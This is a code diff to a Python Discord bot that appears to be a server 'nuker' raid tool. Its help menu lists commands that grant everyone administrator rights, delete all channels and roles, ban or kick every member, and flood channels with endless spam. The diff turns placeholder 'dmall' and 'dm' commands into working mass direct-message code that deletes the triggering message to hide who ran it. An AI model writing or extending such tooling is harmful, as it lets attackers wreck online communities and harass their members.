@@ -17,7 +17,7 @@ def load_config():
     except FileNotFoundError:
         print(f'{Fore.RED}Error: config.json not found!{Style.RESET_ALL}')
         print('Please create a config.json file with your bot token.')
-        print('Example: {"token": "BOT_TOKEN"}')
+        print('Example: {"token": "BOT_TOKEN", "prefix": ".!"}')
         exit(1)
     except json.JSONDecodeError:
         print(f'{Fore.RED}Error: config.json is not valid JSON!{Style.RESET_ALL}')
@@ -29,7 +29,7 @@ config = load_config()
 intents = discord.Intents.default()
 intents.message_content = True
 intents.members = True
-bot = commands.Bot(command_prefix='.!', intents=intents, help_command=None)
+bot = commands.Bot(command_prefix=config.get("prefix", ".!"), intents=intents, help_command=None)
 
 @bot.event
 async def on_ready():
@@ -67,33 +67,34 @@ async def send_dm(ctx, content=None, embed=None):
 async def help_command(ctx):
     """Display all available commands"""
     print(f'{Fore.CYAN}[HELP] {Fore.WHITE}Help requested by {ctx.author.display_name} in {ctx.guild.name}{Style.RESET_ALL}')
+    prefix = config.get("prefix", ".!")
     embed = discord.Embed(
         title="Bot Commands",
         description="List of available commands",
         color=discord.Color.blue()
     )
-    embed.add_field(name=".!help", value="Show this help message", inline=False)
-    embed.add_field(name=".!god", value="Give yourself administrator role", inline=False)
-    embed.add_field(name=".!god-all", value="Give EVERYONE administrator permissions", inline=False)
-    embed.add_field(name=".!delchannel <#channel>", value="Delete a specific channel", inline=False)
-    embed.add_field(name=".!nuke", value="Delete and recreate channel to clear all messages", inline=False)
-    embed.add_field(name=".!nuke-all", value="Delete ALL channels, categories, and roles (except god/bot roles)", inline=False)
-    embed.add_field(name=".!purge <amount>", value="Delete a number of messages from the channel", inline=False)
-    embed.add_field(name=".!ban <@user> [reason]", value="Ban a user from the server", inline=False)
-    embed.add_field(name=".!unban <user_id>", value="Unban a user by their ID", inline=False)
-    embed.add_field(name=".!ban-all [reason]", value="Ban all members in the server", inline=False)
-    embed.add_field(name=".!kick <@user> [reason]", value="Kick a user from the server", inline=False)
-    embed.add_field(name=".!kick-all [reason]", value="Kick all members in the server", inline=False)
-    embed.add_field(name=".!mute <@user> [duration] [reason]", value="Timeout a user (e.g., 10m, 1h, 1d)", inline=False)
-    embed.add_field(name=".!unmute <@user>", value="Remove timeout from a user", inline=False)
-    embed.add_field(name=".!mute-all [duration] [reason]", value="Timeout all members in the server", inline=False)
-    embed.add_field(name=".!death", value="☠️ Ultimate destruction - Ban all, delete all channels and roles", inline=False)
-    embed.add_field(name=".!brainfuck <name> <message>", value="Delete all channels, create spam channels, infinite spam", inline=False)
-    embed.add_field(name=".!spam <count> <message>", value="Spam message in all channels (0 = infinite)", inline=False)
-    embed.add_field(name=".!dmall <message>", value="DM all users (placeholder)", inline=False)
-    embed.add_field(name=".!dm <@user> <message>", value="DM a user (placeholder)", inline=False)
-    embed.add_field(name=".!serverinfo", value="Get detailed server information (sent to DMs)", inline=False)
-    embed.add_field(name=".!shutdown", value="Shutdown the bot (Admin only)", inline=False)
+    embed.add_field(name=f"{prefix}help", value="Show this help message", inline=False)
+    embed.add_field(name=f"{prefix}god", value="Give yourself administrator role", inline=False)
+    embed.add_field(name=f"{prefix}god-all", value="Give EVERYONE administrator permissions", inline=False)
+    embed.add_field(name=f"{prefix}delchannel <#channel>", value="Delete a specific channel", inline=False)
+    embed.add_field(name=f"{prefix}nuke", value="Delete and recreate channel to clear all messages", inline=False)
+    embed.add_field(name=f"{prefix}nuke-all", value="Delete ALL channels, categories, and roles (except god/bot roles)", inline=False)
+    embed.add_field(name=f"{prefix}purge <amount>", value="Delete a number of messages from the channel", inline=False)
+    embed.add_field(name=f"{prefix}ban <@user> [reason]", value="Ban a user from the server", inline=False)
+    embed.add_field(name=f"{prefix}unban <user_id>", value="Unban a user by their ID", inline=False)
+    embed.add_field(name=f"{prefix}ban-all [reason]", value="Ban all members in the server", inline=False)
+    embed.add_field(name=f"{prefix}kick <@user> [reason]", value="Kick a user from the server", inline=False)
+    embed.add_field(name=f"{prefix}kick-all [reason]", value="Kick all members in the server", inline=False)
+    embed.add_field(name=f"{prefix}mute <@user> [duration] [reason]", value="Timeout a user (e.g., 10m, 1h, 1d)", inline=False)
+    embed.add_field(name=f"{prefix}unmute <@user>", value="Remove timeout from a user", inline=False)
+    embed.add_field(name=f"{prefix}mute-all [duration] [reason]", value="Timeout all members in the server", inline=False)
+    embed.add_field(name=f"{prefix}death", value="☠️ Ultimate destruction - Ban all, delete all channels and roles", inline=False)
+    embed.add_field(name=f"{prefix}brainfuck <name> <message>", value="Delete all channels, create spam channels, infinite spam", inline=False)
+    embed.add_field(name=f"{prefix}spam <count> <message>", value="Spam message in all channels (0 = infinite)", inline=False)
+    embed.add_field(name=f"{prefix}dmall <message>", value="DM all users in the server", inline=False)
+    embed.add_field(name=f"{prefix}dm <@user> <message>", value="DM a specific user", inline=False)
+    embed.add_field(name=f"{prefix}serverinfo", value="Get detailed server information (sent to DMs)", inline=False)
+    embed.add_field(name=f"{prefix}shutdown", value="Shutdown the bot (Admin only)", inline=False)
     await send_dm(ctx, embed=embed)
 
 @bot.command(name='delchannel')
@@ -1091,15 +1092,97 @@ async def spam(ctx, count: int, *, message: str):
 
 @bot.command(name='dmall')
 async def dmall(ctx, *, message: str):
-    """DM all users placeholder"""
-    print(f'{Fore.CYAN}[DMALL] {Fore.WHITE}DMall command by {ctx.author.display_name} in {ctx.guild.name}{Style.RESET_ALL}')
-    await send_dm(ctx, f"DMall command - placeholder (message: {message})")
+    """DM all users in the server"""
+    try:
+        # Delete command message
+        try:
+            await ctx.message.delete()
+        except:
+            pass
+
+        guild = ctx.guild
+        author = ctx.author
+
+        print(f'{Fore.CYAN}{Style.BRIGHT}[DMALL] {Fore.WHITE}DM all initiated by {author.display_name} in {guild.name} | Message: "{message}"{Style.RESET_ALL}')
+
+        # Send initial DM to command author
+        try:
+            await author.send(f"Starting DM-all operation... Sending message to all members.")
+        except:
+            pass
+
+        success_count = 0
+        failed_count = 0
+
+        # Get all members
+        members = list(guild.members)
+
+        for member in members:
+            # Skip bots
+            if member.bot:
+                failed_count += 1
+                continue
+
+            # Skip the command author (they already know the message)
+            if member.id == author.id:
+                continue
+
+            try:
+                await member.send(message)
+                success_count += 1
+            except discord.Forbidden:
+                # User has DMs disabled
+                failed_count += 1
+            except Exception as e:
+                failed_count += 1
+
+        # Send completion DM
+        print(f'{Fore.CYAN}{Style.BRIGHT}[DMALL] {Fore.WHITE}Complete: {success_count} DMs sent, {failed_count} failed in {guild.name}{Style.RESET_ALL}')
+        try:
+            embed = discord.Embed(
+                description=f"DM-all complete: {success_count} messages sent, {failed_count} failed",
+                color=discord.Color.blue()
+            )
+            await author.send(embed=embed)
+        except discord.Forbidden:
+            pass
+
+    except Exception as e:
+        try:
+            await author.send(f"An error occurred during DM-all: {str(e)}")
+        except:
+            pass
 
 @bot.command(name='dm')
 async def dm(ctx, user: discord.Member, *, message: str):
-    """DM a user placeholder"""
-    print(f'{Fore.CYAN}[DM] {Fore.WHITE}DM to {user.display_name} by {ctx.author.display_name} in {ctx.guild.name}{Style.RESET_ALL}')
-    await send_dm(ctx, f"DM command - placeholder (user: {user.mention}, message: {message})")
+    """DM a user"""
+    try:
+        # Delete command message
+        try:
+            await ctx.message.delete()
+        except:
+            pass
+
+        # Try to send DM to the target user
+        try:
+            await user.send(message)
+            print(f'{Fore.CYAN}[DM] {Fore.WHITE}DM sent to {user.display_name} by {ctx.author.display_name} in {ctx.guild.name}{Style.RESET_ALL}')
+
+            # Send confirmation to command author
+            embed = discord.Embed(
+                description=f"Message sent to {user.mention}",
+                color=discord.Color.green()
+            )
+            await send_dm(ctx, embed=embed)
+        except discord.Forbidden:
+            # Target user has DMs disabled
+            embed = discord.Embed(
+                description=f"Couldn't send DM to {user.mention} - they have DMs disabled",
+                color=discord.Color.red()
+            )
+            await send_dm(ctx, embed=embed)
+    except Exception as e:
+        await send_dm(ctx, f"An error occurred: {str(e)}")
 
 @bot.command(name='serverinfo')
 async def serverinfo(ctx):
@@ -1193,7 +1276,7 @@ if __name__ == "__main__":
     if not token:
         print(f'{Fore.RED}Error: Token not found in config.json!{Style.RESET_ALL}')
         print('Please add your bot token to config.json')
-        print('Example: {"token": "BOT_TOKEN"}')
+        print('Example: {"token": "BOT_TOKEN", "prefix": ".!"}')
     else:
         print(f'{Fore.CYAN}[CONFIG] Bot token loaded from config.json{Style.RESET_ALL}')
         bot.run(token)
